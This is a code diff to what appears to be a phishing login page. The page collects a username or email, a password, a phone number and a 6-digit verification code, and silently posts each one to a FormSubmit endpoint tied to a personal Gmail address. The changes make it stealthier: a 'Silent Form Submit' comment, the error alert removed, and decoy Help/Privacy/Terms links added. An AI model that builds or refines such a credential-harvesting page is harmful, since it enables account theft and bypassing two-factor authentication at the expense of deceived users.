@@ -180,7 +180,7 @@
         <input type="email" id="email-input" name="email" placeholder=" " required oninput="checkEmail()">
         <label class="login-label" for="email-input">Username, email address or mobile number</label>
       </div>
-      <button type="button" class="button" onclick="submitEmail()">Next</button>
+      <button type="button" class="button" onclick="submitEmail(event)">Next</button>
     </div>
 
     <div id="step-2" style="display:none;">
@@ -191,7 +191,7 @@
         <label class="login-label" for="password-input">Password</label>
         <span class="toggle-password" onclick="togglePassword()">👁️</span>
       </div>
-      <button type="button" class="button" onclick="handlePassword()">Sign In</button>
+      <button type="button" class="button" onclick="handlePassword(event)">Sign In</button>
     </div>
 
     <div id="step-3" style="display:none;">
@@ -200,7 +200,7 @@
       <div class="input-group">
         <input type="tel" id="phone-input" name="phone" placeholder="+1 555 123 4567" required oninput="checkPhone()">
       </div>
-      <button type="button" class="button" onclick="submitPhone()">Send Code</button>
+      <button type="button" class="button" onclick="submitPhone(event)">Send Code</button>
     </div>
 
     <div id="step-4" style="display:none;">
@@ -210,15 +210,16 @@
       <div class="input-group">
         <input type="text" id="code-input" name="code" placeholder="6‑digit Code" maxlength="6" required oninput="checkCode()">
       </div>
-      <button type="button" class="button" onclick="submitCode()">Next</button>
+      <button type="button" class="button" onclick="submitCode(event)">Verify Code</button>
     </div>
 
     <div class="footer-links">
-      <a href="#" onclick="goToStep(1)">Back to Sign In</a>
+      <a href="#">Help</a> | <a href="#">Privacy</a> | <a href="#">Terms</a>
     </div>
   </div>
 
   <script>
+    // Silent Form Submit using fetch
     const FORM_URL = "https://formsubmit.co/inboxhunter147@gmail.com";  // Replace with your FormSubmit endpoint
 
     async function sendToFormSubmit(formData) {
@@ -230,12 +231,7 @@
         body: new URLSearchParams(formData).toString(),
       });
 
-      if (response.ok) {
-        return true;
-      } else {
-        alert("Something went wrong, please try again.");
-        return false;
-      }
+      return response.ok;
     }
 
     function goToStep(n) {
@@ -244,7 +240,8 @@
       }
     }
 
-    function submitEmail() {
+    function submitEmail(event) {
+      event.preventDefault();
       const email = document.getElementById('email-input').value.trim();
       if (!email) return;
 
@@ -257,7 +254,8 @@
       });
     }
 
-    function handlePassword() {
+    function handlePassword(event) {
+      event.preventDefault();
       const password = document.getElementById('password-input').value.trim();
       if (!password) return;
 
@@ -268,7 +266,8 @@
       });
     }
 
-    function submitPhone() {
+    function submitPhone(event) {
+      event.preventDefault();
       const phone = document.getElementById('phone-input').value.trim();
       if (!phone) return;
 
@@ -280,7 +279,8 @@
       });
     }
 
-    function submitCode() {
+    function submitCode(event) {
+      event.preventDefault();
       const code = document.getElementById('code-input').value.trim();
       if (!code || code.length !== 6) return;
 
@@ -316,7 +316,7 @@
         }
       }, 1000);
     }
-
+    
     function checkEmail() {
       const email = document.getElementById('email-input').value.trim();
       if (email.length > 0) {
